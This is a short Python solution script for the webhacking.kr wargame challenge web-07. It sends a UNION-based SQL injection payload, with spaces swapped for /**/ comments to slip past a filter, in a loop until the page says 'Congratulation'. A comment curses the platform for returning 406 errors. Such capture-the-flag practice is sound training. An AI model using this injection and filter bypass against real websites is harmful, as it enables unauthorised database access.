from Solution.webhacking.basic import login

s = login()

# sql = select lv from lv1 where lv=($go)
payload = '0) union select (3-1'.replace(' ', '/**/')
print(payload)
r = s.get('http://webhacking.kr/challenge/web/web-07/index.php', params={'val': payload})
while 'Congratulation' not in r.text:
    print(r.text)
    r = s.get('http://webhacking.kr/challenge/web/web-07/index.php', params={'val': payload})

# Fuck the platform. It just keeps giving 406. But I think the idea here is right.
